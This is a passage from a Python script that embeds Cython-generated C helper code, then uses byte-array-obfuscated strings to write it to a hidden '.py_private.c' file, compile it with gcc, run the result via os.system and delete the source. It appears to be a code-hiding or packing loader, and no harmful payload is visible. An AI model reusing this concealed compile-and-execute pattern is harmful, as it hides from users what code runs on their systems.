#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = bytes([46, 112, 121, 95, 112, 114, 105, 118, 97, 116, 101, 46, 99]).decode()
PYTHON_VERSION = bytes([46]).decode().join(sys.version.split(bytes([32]).decode())[0].split(bytes([46]).decode())[:-1])
COMPILE_FILE = (
    bytes([103, 99, 99, 32, 45, 73]).decode() +
    PREFIX +
    bytes([47, 105, 110, 99, 108, 117, 100, 101, 47, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION +
    bytes([32, 45, 111, 32]).decode() +
    EXECUTE_FILE +
    bytes([32]).decode() +
    C_FILE +
    bytes([32, 45, 76]).decode() +
    PREFIX +
    bytes([47, 108, 105, 98, 32, 45, 108, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION
)


with open(C_FILE, bytes([119]).decode()) as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+COMPILE_FILE+bytes([32, 38, 38, 32]).decode()+RUN)

os.remove(C_FILE)
